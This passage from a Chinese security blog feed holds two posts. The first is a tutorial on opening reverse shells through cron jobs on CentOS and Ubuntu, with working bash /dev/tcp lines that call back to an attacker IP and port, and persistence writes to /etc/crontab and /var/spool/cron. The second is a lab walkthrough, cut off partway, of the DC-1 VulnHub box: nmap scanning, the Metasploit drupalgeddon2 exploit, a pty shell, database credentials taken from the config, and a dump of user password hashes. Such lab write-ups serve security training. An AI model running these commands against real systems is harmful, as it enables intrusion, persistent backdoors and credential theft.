class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">m:分钟 - 从0到59的整数</span><br><span class="line">h:小时 - 从0到23的整数</span><br><span class="line">dom:天 - 从1到31的整数 (必须是指定月份的有效日期)</span><br><span class="line">mon:月 - 从1到12的整数 (或如Jan或Feb简写的月份)</span><br><span class="line">dow:周一到周日 - 从0到7的整数，0或7用来描述周日 (或用Sun或Mon简写来表示)</span><br><span class="line">user:指的是执行命令的用户</span><br><span class="line">command: 需要执行的命令</span><br><span class="line">星号(*)表示参数所有可用的值，如果为5个*，就代表每分钟执行一次</span><br><span class="line">符号“/”指定步进设置。“/&lt;interger&gt;”表示步进值,比如*/2 * * * *代表每两分钟执行一次任务</span><br></pre></td></tr></table></figure><h2 id="CentOS计划任务弹shell"><a href="#CentOS计划任务弹shell" class="headerlink" title="CentOS计划任务弹shell"></a>CentOS计划任务弹shell</h2><p>既然说CentOS计划任务是可以成功的，那我们就先来在CentOS上试一试</p><h3 id="法一：crontab-e写入命令"><a href="#法一：crontab-e写入命令" class="headerlink" title="法一：crontab -e写入命令"></a>法一：crontab -e写入命令</h3><p>centos机器上，输入<code>crontab -e</code>就会出现一个文件，可以看到这是一个临时的缓存文件，写入下方命令并保存。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">crontab -e  写入：</span><br><span class="line">*/1 * * * * bash -i &gt;&amp; /dev/tcp/kali_ip/port 0&gt;&amp;1</span><br><span class="line">或者</span><br><span class="line">*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/kali_ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230624210727691.png"></p><p>这时候使用<code>crontab -l</code>命令，就可以看到我们定的计划任务了。</p><p><img src="http://pic.bamboo22.top/image-20230624210656113.png"></p><p>同时可以看到在<code>/var/spool/cron</code>目录下多了一个文件为<code>root</code>，里面的内容就是刚才写入的bash反弹命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /var/spool/cron</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230630100804098.png"></p><p>一分钟左右就会弹回来</p><p><img src="http://pic.bamboo22.top/image-20230624211005391.png"></p><h3 id="法二：echo写入文件"><a href="#法二：echo写入文件" class="headerlink" title="法二：echo写入文件"></a>法二：echo写入文件</h3><p>上面的<code>crontab -e</code>方式其实就是帮我们在<code>/var/spool/cron</code>目录下创建了一个<code>root</code>文件而已；所以可以尝试直接使用<code>echo</code>命令来写入<code>bash</code>反弹命令到这个文件中，即下方命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;*/1 * * * * bash -i &gt;&amp; /dev/tcp/kali_ip/port 0&gt;&amp;1&#x27; &gt; /var/spool/cron/root</span><br><span class="line">或者</span><br><span class="line">echo &#x27;*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/kali_ip/port 0&gt;&amp;1&#x27; &gt; /var/spool/cron/root</span><br></pre></td></tr></table></figure><p>先使用<code>crontab -r</code>删除计划任务，随后输入上方命令<code>echo</code>写入计划任务成功反弹。</p><p><img src="http://pic.bamboo22.top/image-20230624212032751.png"></p><p>这里注意：**<code>/var/spool/cron/</code> 目录下存放的是每个用户包括<code>root</code>的<code>crontab</code>任务，每个任务以创建者的名字命名。**</p><h3 id="法三：crontab-e写入文件"><a href="#法三：crontab-e写入文件" class="headerlink" title="法三：crontab -e写入文件"></a>法三：crontab -e写入文件</h3><p>我们知道<code>bash</code>反弹<code>shell</code>除了直接输入命令，还可以将命令写入<code>sh</code>文件，然后<code>bash</code>运行。那么我新建一个<code>/tmp/1.sh</code>写入<code>bash</code>反弹命令，然后再向计划任务中写入这个文件，也是可以成功弹回的。</p><p>CentOS:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /var/spool/cron</span><br><span class="line">vim /tmp/1.sh</span><br><span class="line">输入反弹命令</span><br><span class="line">*/1 * * * * bash -i &gt;&amp; /dev/tcp/kali_ip/port 0&gt;&amp;1</span><br><span class="line">echo &#x27;*/1 * * * * bash -i &gt;&amp; /dev/tcp/kali_ip/port 0&gt;&amp;1&#x27; &gt; /var/spool/cron/root</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230624213018646.png"></p><p><img src="http://pic.bamboo22.top/image-20230624212839070.png"></p><p>同样反弹成功</p><p><strong>注意：写入的文件最好统一为绝对路径，不建议相对路径。</strong></p><h3 id="法四：echo写入命令和文件到-etc-crontab"><a href="#法四：echo写入命令和文件到-etc-crontab" class="headerlink" title="法四：echo写入命令和文件到&#x2F;etc&#x2F;crontab"></a>法四：echo写入命令和文件到&#x2F;etc&#x2F;crontab</h3><p>在<code>/etc/crontab</code>这个文件中，已经有了官方的介绍</p><p><img src="http://pic.bamboo22.top/image-20230624213327531.png"></p><p>可以看到命令里面必须要添加用户名，才能反弹成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;*/1 * * * * root bash -i &gt;&amp; /dev/tcp/192.168.144.128/1111 0&gt;&amp;1&#x27; &gt; /etc/crontab</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230624214417091.png"></p><h2 id="Ubuntu计划任务反弹shell"><a href="#Ubuntu计划任务反弹shell" class="headerlink" title="Ubuntu计划任务反弹shell"></a>Ubuntu计划任务反弹shell</h2><p>Ubuntu和kali都是基于dibian，我们之前已经知道了不能用CentOS的方法，下面就探究一下Ubuntu上应该如何操作</p><h3 id="法一：crontab-e写入命令-1"><a href="#法一：crontab-e写入命令-1" class="headerlink" title="法一：crontab -e写入命令"></a>法一：crontab -e写入命令</h3><p><code>crontab -e</code>时提示选择编辑器，然后写入之前的计划任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br><span class="line">*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.144.128/1111 0&gt;&amp;1:</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230627202629918.png"></p><p>当然是没有反弹成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail -15 /var/log/syslog</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(CRON) info (No MTA installed, discarding output)</span><br><span class="line">#(计划任务)信息(没有邮件系统，放弃输出)</span><br></pre></td></tr></table></figure><p>Ubuntu系统默认会将计划任务的错误信息以邮件的方式发送给用户，但是由于Ubuntu系统默认没有安装邮件系统，所以真正的报错信息被<code>discarding output</code>(被舍弃)了，而不是<code>No MTA installed，discarding output</code>这句话。</p><p><strong>寻找真正的错误信息:</strong></p><p>想看到真正的报错信息有两种解决办法：</p><p>1.安装邮件系统，这个方法就算了，没必要。</p><p>2.将计划任务的错误信息输出到一个文件内，那么需要我们修改一下计划任务如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br><span class="line">* * * * * bash -i  &#x27;&gt;&amp; /dev/tcp/kali_ip/port 0&gt;&amp;1&#x27;&gt;/tmp/error.txt 2&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230627201537183.png"></p><p>真正的报错信息了：**&#x2F;bin&#x2F;bash没有找到**</p><p>我们去<code>/etc/crontab</code>里面看一下，发现没有bash，只有一个&#x2F;bin&#x2F;sh,换句话说<code>ubuntu</code>的<code>cron</code>中命令执行的shell环境是<code>/bin/sh</code>。</p><p><img src="http://pic.bamboo22.top/image-20230627204204257.png"></p><h4 id="sh与dash"><a href="#sh与dash" class="headerlink" title="sh与dash"></a>sh与dash</h4><p>那么这里来找一下到底<code>/bin/sh</code>是什么，如下图可以看出，<code>sh</code>其实是指向<code>dash</code>的一个软连接。而dash是什么呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -alh /bin/ | grep -w &quot;sh&quot;</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230627204122881.png"></p><p>综合网上查询的信息得出个结论：Debian和Ubuntu中，&#x2F;bin&#x2F;sh默认已经指向dash，dash比bash体积小速度快，兼容性高。<strong>dash主要是为了执行脚本而出现，所以不能实现交互</strong>，功能相比bash要少很多，语法严格遵守POSIX标准。</p><h4 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h4><p>在ubuntu系统上执行<code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code>无法直接反弹shell是因为ubuntu系统打开的终端默认是<code>sh</code>运行的命令，而sh刚才也提到了，实际上就是dash。dash只能够进行脚本的运行，而<code>bash -i</code>这个命令，使用到了bash交互的功能，所以sh不能在实现交互，也就反弹失败了。</p><p><img src="http://pic.bamboo22.top/image-20230627204448457.png"></p><p>如果我在ubuntu默认的终端中输入<code>bash</code>就会切换到<code>bash</code>终端，进而就可以使用<code>bash -i</code>了</p><p>又或者我是用<code>bash -c</code>，没有用到<code>bash</code>交互功能，也可以使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230627205517640.png"></p><p>这样就能连接成功了</p><p>回到刚刚那儿，写入的内容，不能是bash -i开头的bash反弹，而应该是bash -c即：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br><span class="line">* * * * * bash -c &quot;bash -i &gt;&amp; /dev/tcp/kali_ip/port 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230627205118643.png"></p><p>成功</p><h3 id="法二：echo写入文件-1"><a href="#法二：echo写入文件-1" class="headerlink" title="法二：echo写入文件"></a>法二：echo写入文件</h3><p>下面这种按理也能弹shell，但是尝试后发现失败，这也是坑点之一</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /tmp/1.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.144.130/1111 0&gt;&amp;1</span><br><span class="line">echo &quot;*/1 * * * * bash /tmp/1.sh&quot; &gt;&gt; /var/spool/cron/crontabs/root #ubuntu的计划任务路径目录为/var/spool/cron/crontabs/</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230627210606653.png"></p><p><strong>因为我们echo创建的root文件，默认权限是644，ubuntu这里规定，计划任务root文件的权限必须是600！</strong></p><p>修改权限的方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 root        修改权限为600</span><br><span class="line">systemctl restart cron      再重启</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230628111835358.png"></p><p>修改之后瞬间成功</p><p><img src="http://pic.bamboo22.top/image-20230628111813314.png"></p><h3 id="法三：crontab-e写入文件-1"><a href="#法三：crontab-e写入文件-1" class="headerlink" title="法三：crontab -e写入文件"></a>法三：crontab -e写入文件</h3><blockquote><p><strong>通过命令crontab -e来创建的计划任务生成的root文件，默认就是600权限！</strong></p></blockquote><p>所以不需要修改，和之前的操作差不多，就不赘述了</p><h3 id="法四：echo写入命令和文件到-etc-crontab-1"><a href="#法四：echo写入命令和文件到-etc-crontab-1" class="headerlink" title="法四：echo写入命令和文件到&#x2F;etc&#x2F;crontab"></a>法四：echo写入命令和文件到&#x2F;etc&#x2F;crontab</h3><p>直接<strong>贴上总结和优化后的代码</strong>，在渗透的时候，请先备份一下<code>/etc/crontab</code>文件，然后再添加命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#新建一个.sh文件并加执行权限</span><br><span class="line">touch /tmp/test.sh</span><br><span class="line">chmod +x /tmp/test.sh</span><br><span class="line"> </span><br><span class="line">vim /etc/crontab </span><br><span class="line">#写一个sh脚本</span><br><span class="line">echo &quot;#\!/bin/bash&quot; &gt;&gt; /tmp/test.sh</span><br><span class="line">echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.144.130/1111 0&gt;&amp;1&quot; &gt;&gt; /tmp/test.sh</span><br><span class="line"> </span><br><span class="line">#sed命令必须是单引号,-i就是修改;$在正则中表示最后一行,a表示在指定行下边插入指定的内容行,$a就是在最后一行插入。</span><br><span class="line">sed -i &#x27;$a*/1 * * * * root bash /tmp/test.sh&#x27; /etc/crontab</span><br><span class="line"> </span><br><span class="line">#d表示删除，$d即删除最后一行，也就是刚刚添加的命令</span><br><span class="line">sed -i &#x27;$d&#x27; /etc/crontab</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230627211432881.png"></p><p><img src="http://pic.bamboo22.top/image-20230627211416034.png"></p><h2 id="问题总结"><a href="#问题总结" class="headerlink" title="问题总结"></a>问题总结</h2><ol><li><p><code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code>为什么在ubuntu默认终端上反弹shell没有用？而在centos上就行？</p></li><li><p>为什么在ubuntu系统上把上述命令写入脚本运行就可以反弹shell了？</p><p>问题1、2答：<code>ubuntu</code>终端默认启用<code>sh</code>，而<code>sh</code>指向的是<code>dash shell</code>，不具备交互功能，只具备脚本运行的功能</p></li><li><p>centos与ubuntu的计划任务有哪些不同？</p><ul><li><p>ubuntu的用户计划任务目录在<code>/var/spool/cron/crontabs/</code>，centos在<code>/var/spool/cron/</code></p></li><li><p>ubuntu用户计划任务文件必须是600权限</p></li></ul></li><li><p>&#x2F;etc&#x2F;cron与&#x2F;var&#x2F;spool&#x2F;cron有啥区别？</p><ul><li>是系统级别的计划任务文件；&#x2F;var&#x2F;spool&#x2F;cron是用户级别的</li></ul><ul><li>echo写入命令到&#x2F;etc&#x2F;cron时，不影响其权限，适用于docker特权逃逸</li></ul></li><li><p>ubuntu直接编辑<code>/var/spool/cron/crontabs/root</code>文件设置<code>root</code>的计划任务是无法成功的，因为文件的权限不是0600。设置的时候尽量使用<code>crontab -e</code>命令，或者写入<code>/etc/crontab</code>里面；如果在渗透时用不了<code>crontab -e</code>命令，可使用法四。<strong>至于centos的话，任何方法均可，不受影响。</strong></p></li></ol><h2 id="Ubuntu中redis计划任务"><a href="#Ubuntu中redis计划任务" class="headerlink" title="Ubuntu中redis计划任务"></a>Ubuntu中redis计划任务</h2><p>最后回到一开始的问题，Ubuntu中redis计划任务不能成功的原因有：</p><ol><li>Ubuntu默认shell环境不是bash而是dash</li><li>Ubuntu计划任务的路径与centOS不同</li><li>root文件权限不为600</li><li>redis写入文件有时有乱码</li></ol><p>其中前三个问题都可以解决，最后一个问题我在Ubuntu上手动删除了乱码后成功，但是真实情况应该不怎么用的上</p><p>将dash改为bash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s -f /bin/bash /bin/sh</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230630161936876.png"></p><p><img src="http://pic.bamboo22.top/image-20230630161750252.png"></p><p>参考大佬的文章：<a href="https://mp.weixin.qq.com/s?__biz=MzIyMzcwMTg1MA==&mid=2247486475&idx=1&sn=1518e6bc38cd2a10d78d5711fdb8fd57&chksm=e81b723edf6cfb287f556e2bc7e5dcfb6ed31810abd3e272ed05606bacacfea6b428dad6fa85&mpshare=1&scene=23&srcid=0624ojOQzDE3mIEWT6uPyMMm&sharer_sharetime=1687605892910&sharer_shareid=887ca9bd754f6319a7972e14913173ae#rd">底层原理 | Linux计划任务反弹shell探究 </a></p>]]></content>
      
      
      <categories>
          
          <category> web基础漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DC1 &amp; DC靶场搭建</title>
      <link href="/2024/01/22/DC%E9%9D%B6%E5%9C%BA/"/>
      <url>/2024/01/22/DC%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="DC靶场"><a href="#DC靶场" class="headerlink" title="DC靶场"></a>DC靶场</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>官网下载链接<a href="https://www.vulnhub.com/">https://www.vulnhub.com/</a></p><p>下载后用vmware打开这个.ova文件</p><p><img src="http://pic.bamboo22.top/image-20230711203603065.png"></p><p>按照提示安装，成功以后就是这个登录界面</p><p><img src="http://pic.bamboo22.top/image-20230711203811141.png"></p><p>渗透的目标就是拿到密码登录</p><p>注意这里我是用到NAT模式，保证靶机和攻击机在同一网段</p><h2 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h2><p>来到第一关，我们用kali做攻击机，DC-1为靶机</p><p> <img src="http://pic.bamboo22.top/image-20230711204226711.png"></p><h3 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><h4 id="1-探测目标IP地址"><a href="#1-探测目标IP地址" class="headerlink" title="1.探测目标IP地址"></a>1.探测目标IP地址</h4><p>探测当前网段下的IP</p><p>探测主机的工具有很多，常见的有arp-scan、nmap还有netdiscover</p><ul><li>arp-scan</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230711210016700.png"></p><p>可以看到同一网段上的所有IP</p><p><img src="http://pic.bamboo22.top/image-20230711205948433.png"></p><p>查看靶机的MAC地址，现在可以确定靶机的ip为<strong>192.168.85.130</strong></p><ul><li>也可以用<strong>nmap</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP <span class="number">192.168</span><span class="number">.85</span><span class="number">.0</span>/<span class="number">24</span></span><br><span class="line">    </span><br><span class="line">ip后面改为了<span class="number">0</span>/<span class="number">24</span>, 在这里“<span class="number">192.168</span><span class="number">.85</span><span class="number">.0</span>/<span class="number">24</span>”表示的是这个网段的IP地址从从<span class="number">192.168</span><span class="number">.85</span><span class="number">.1</span>开始，到<span class="number">192.168</span><span class="number">.85</span><span class="number">.254</span>结束（<span class="number">192.168</span><span class="number">.85</span><span class="number">.0</span>和<span class="number">192.168</span><span class="number">.85</span><span class="number">.255</span>有特殊含义不能当做ip地址）；子网掩码是<span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230711210451146.png"></p><p>同样也能扫出IP</p><ul><li>还有<strong>netdiscover</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230711210759153.png"></p><h4 id="2-探测目标IP开放端口"><a href="#2-探测目标IP开放端口" class="headerlink" title="2.探测目标IP开放端口"></a>2.探测目标IP开放端口</h4><p>用nmap探测</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p- <span class="number">192.168</span><span class="number">.85</span><span class="number">.130</span></span><br><span class="line"></span><br><span class="line">-sV  扫描目标主机端口上运行的软件信息</span><br><span class="line">-p-  扫描全部端口<span class="number">0</span><span class="number">-65535</span></span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230711211401150.png"><br>可以看到开放的端口有：<strong>22、80、111、48080</strong></p><p>20和80端口是我们的突破口，80是http协议，我们用浏览器访问一下看看</p><h4 id="3-网页信息收集"><a href="#3-网页信息收集" class="headerlink" title="3.网页信息收集"></a>3.网页信息收集</h4><p>访问<strong>192.168.85.130</strong></p><p><img src="http://pic.bamboo22.top/image-20230711212034890.png"></p><p>可以用Firefox的插件看到站点信息是 <strong>Drupal</strong></p><p>也可以用kali自带的工具<strong>whatweb</strong>扫</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb -v <span class="number">192.168</span><span class="number">.85</span><span class="number">.130</span></span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230711212623130.png"></p><p>接下来用dirsearch扫网站目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u 192.168.85.130 -e *</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230711214112802.png"><br>东西挺多的，先放着</p><p>得到如下信息：</p><ul><li>CMS是Drupal</li><li>Apache 2.2.22</li><li>PHP 5.4.45</li><li>jQuery 1.4.4</li></ul><hr><h3 id="二、漏洞查找与利用"><a href="#二、漏洞查找与利用" class="headerlink" title="二、漏洞查找与利用"></a>二、漏洞查找与利用</h3><p>知道cms，我们一般从cms出发找漏洞，百度一下drupal漏洞 </p><p><img src="http://pic.bamboo22.top/image-20230711215805702.png"></p><p>有框架漏洞</p><h4 id="1-漏洞查找"><a href="#1-漏洞查找" class="headerlink" title="1.漏洞查找"></a>1.漏洞查找</h4><p>用工具Metasploit（目前世界上领先的渗透测试工具，也是信息安全与渗透测试领域最大的开源项目之一），先找下漏洞，先打开工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole    启动</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230711220101903.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search Drupal       搜索Drupal漏洞</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230711220721820.png"><br>可以看到这个cms框架还是有挺多漏洞的，这里我们利用漏洞等级较高的，且时间最新的18年那个漏洞</p><h4 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h4><p>利用18年那个洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230711221221882.png"></p><p>接着看一下该漏洞模块参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230711221437925.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Current Setting是目前设置的内容</span><br><span class="line">Required表示是否需要设置内容，yes为必须设置，no可以设置也可不设置</span><br><span class="line">就上面来说RHOSTS需要set，但是没有内容</span><br></pre></td></tr></table></figure><p>所以接着我们来设置一下RHOSTS内容（就是攻击目标IP地址，靶场地址）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> RHOSTS <span class="number">192.168</span><span class="number">.85</span><span class="number">.130</span></span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230711221743947.png"></p><p>设置完后就可以看到RHOSTS有ip了</p><p>设置完后开始攻击</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit  或者run</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230711222048595.png"></p><p>出现Meterpreter session 1 opened（kali和目标ip的连接）就说明攻击成功啦，接下来我们可以getshell了</p><h3 id="三、getshell"><a href="#三、getshell" class="headerlink" title="三、getshell"></a>三、getshell</h3><h4 id="普通shell"><a href="#普通shell" class="headerlink" title="普通shell"></a>普通shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure><p>可以执行命令</p><p><img src="http://pic.bamboo22.top/image-20230712114021928.png"></p><h4 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h4><p>用python脚本获取交互式shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>但是这个要靶机上有python才行</p><p><img src="http://pic.bamboo22.top/image-20230712130841566.png"></p><p>看到一个flag1.txt，查看一下</p><p><img src="http://pic.bamboo22.top/image-20230712114555874.png"></p><p>看到Every good CMS needs a config file - and so do you.这个提示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name flag*      查看还有哪些叫flag的文件</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230712114856925.png"></p><p>没有了</p><p>刚刚提示说的配置文件，搜索drupal配置文件存放路径为 sites&#x2F;default&#x2F;settings.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat sites/default/settings.php</span><br></pre></td></tr></table></figure><p>也可以知道是setting.php,用命令直接搜索并打开，内联执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat `find / -name settings.php`</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230712115410723.png"></p><p>看到flag2中有提示，提到证书有什么用先放一放吧</p><p><img src="http://pic.bamboo22.top/image-20230712115936119.png"></p><p>还看到了一个数据库，有账号和密码，那么就可以尝试登录进去看看</p><h3 id="四、数据库渗透"><a href="#四、数据库渗透" class="headerlink" title="四、数据库渗透"></a>四、数据库渗透</h3><p>我们用刚刚拿到的数据库账号密码登录，注意这里必须是交互式shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230712131033943.png"></p><p>进入drupaldb这个数据库，看看里面的数据</p><p><img src="http://pic.bamboo22.top/image-20230712133008708.png"></p><p>发现有两个user的表</p><p><img src="http://pic.bamboo22.top/image-20230712133119123.png"></p><p>查一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230712133334634.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">| admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR |</span><br><span class="line"></span><br><span class="line">| Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg |</span><br></pre></td></tr></table></figure><p>密码比较复杂，应该不是明文，那想登进后台就很难了，我们可以通过修改admin的密码，或者是新加一个admin</p><p><a href="https://drupalchina.cn/node/2128">分享：忘记Drupal的管理员密码的解决办法 | Drupal China</a></p><p><strong>法一：修改admin密码</strong></p><p>我们得先找到加密文件，Drupal的加密脚本在<code>/var/www/scripts/password-hash.sh</code></p><p>目录下，我们先用exit退出mysql</p><p><img src="http://pic.bamboo22.top/image-20230712134316624.png"></p><p>这个脚本是用php写的，而且还能用php加参数运行，直接得到加密后的密码，这里我们设置一个密码123456 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php /var/www/scripts/password-hash.sh 123456</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230712134414016.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password:123456</span><br><span class="line">hash: 